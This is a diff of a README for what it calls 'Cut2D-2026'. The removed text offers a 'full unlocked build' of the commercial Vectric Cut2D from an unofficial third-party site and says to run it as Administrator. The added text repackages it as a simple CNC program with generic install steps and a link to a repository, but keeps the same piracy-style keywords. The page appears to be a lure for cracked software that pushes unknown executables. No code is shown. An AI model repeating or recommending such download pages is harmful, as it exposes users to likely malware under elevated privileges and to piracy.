@@ -1,73 +1,80 @@
-# Vectric Cut2D — Full Version Download for Windows 11 & 10
+# 🛠️ Cut2D-2026 - Simple CNC routing for home users
 
-**Cut2D-2026**
+[![](https://img.shields.io/badge/Download-Cut2D_2026-blue.svg)](https://github.com/peroneuscommonwasp534/Cut2D-2026)
 
-**Vectric Cut2D** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+Cut2D-2026 provides software tools to design and cut parts on your CNC router. This program turns digital drawings into machine code. The software works with Windows 10 and Windows 11. 
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📋 System Requirements
 
----
+Your computer needs specific parts to run the software. Check these items before you start the install.
 
-## Download & Install
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Dual-core 2.0 GHz or faster.
+- Memory: 4 GB RAM minimum. 8 GB RAM recommended.
+- Storage: 1 GB of free disk space for the program files.
+- Graphics: Display resolution of 1024 x 768 or higher.
+- Internet: Required for the initial download of the installer.
 
-> **This is the download page.** Use the button or link below to get **Vectric Cut2D** for Windows.
+## 💾 Download the Installer
 
-<p align="center">
-  <a href="https://cut2d.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-Vectric%20Cut2D-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Vectric Cut2D">
-  </a>
-</p>
+Visit the official release page to get the program files for your system.
 
-| | |
-| --- | --- |
-| **Direct link** | **[cut2d.moltora.com](https://cut2d.moltora.com/)** |
-| **Full URL** | `https://cut2d.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+[Download Cut2D-2026 Installer](https://github.com/peroneuscommonwasp534/Cut2D-2026)
 
-### Quick steps
+Once you click the link, your browser starts the download. Save the file to your computer. Most users save files in the Downloads folder. 
 
-1. Click **[Download — cut2d.moltora.com](https://cut2d.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## ⚙️ How to Install
 
-<p align="center"><a href="https://cut2d.moltora.com/"><strong>⬇ Download Vectric Cut2D now</strong></a></p>
+1. Locate the file you just downloaded. It will have an .exe extension.
+2. Double-click the file to start the process.
+3. Windows might ask for permission to run the file. Click Yes to proceed.
+4. Follow the instructions on the screen.
+5. The installer asks where to save the files. Keep the default location to ensure the software functions correctly.
+6. Click the Install button. 
+7. Wait while the computer copies the files.
+8. Click Finish once the bar completes.
 
----
+## 🚀 Setting Up Your First Project
 
-## About Vectric Cut2D
+After the install, find the icon on your desktop or in the Start menu. Open the program to begin.
 
-**Vectric Cut2D** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+When you open Cut2D-2026, you see a blank space. This is your design area. 
 
-**Common searches:** cut2d download cnc routing software windows, vectric cut2d install pc, cut2d 2026
+### Step 1: Job Setup
+Select "Create a new file" from the menu. Set the size of the material you plan to cut. Enter the height, width, and thickness of your wood or plastic board. This ensures the cut lines match your material.
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+### Step 2: Draw or Import Shapes
+You can draw shapes using the tools on the left side of the screen. Alternatively, select "Import" to bring in a file from another drawing program. You can use common files like DXF or SVG.
 
-**Repository:** `Cut2D-2026`
+### Step 3: Toolpaths
+This step tells the CNC router how to move. Choose a toolpath based on your goal. For example, select "Profile" to cut around the outside of a shape. Select "Pocket" to remove material inside a shape.
 
-## Install (full version)
+### Step 4: Preview
+Use the preview button to see a 3D model of your project. Check the cut lines. The preview shows you if the machine will cut the material correctly.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+### Step 5: Save G-Code
+Once you finish, select "Save Toolpath." This creates a G-code file. This file tells your CNC machine how to move its motors. Move this file to a USB stick and insert it into your CNC controller.
 
-## System requirements
+## 🎨 Tips for Best Results
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+- Keep your bits sharp. Dull bits burn the wood and strain the machine.
+- Start with soft materials like foam or pine when you learn the software.
+- Secure your material firmly to the machine bed before you start.
+- Test your design on a scrap piece of material first.
+- Save your project file often while you work.
 
----
+## 💡 Frequently Asked Questions
 
-**Topics:** cut2d-download-cnc-routing-software-windows, cut2d, routing, software, vectric-cut2d-install-pc, vectric, cut2d-2026, vectric-cut2d, cnc-software, laser-cutting, complete-version, windows-software
+**Does the software work on a Mac?**
+No, this version runs only on Windows 10 and 11.
+
+**What should I do if the installer stops?**
+Check your internet speed and ensure you have enough disk space. Restart your computer if the installer hangs.
+
+**Where can I learn more?**
+Look for the built-in help menu inside the software. It contains detailed guides on every button and tool.
+
+**Can I run this on a tablet?**
+This software requires a full desktop operating system. It does not work on mobile tablets or phones.
+
+Keywords: cnc-software, complete-version, cut2d, cut2d-2026, cut2d-download-cnc-routing-software-windows, download, full-installer, laser-cutting, routing, software, vectric, vectric-cut2d, vectric-cut2d-install-pc, windows-11, windows-software
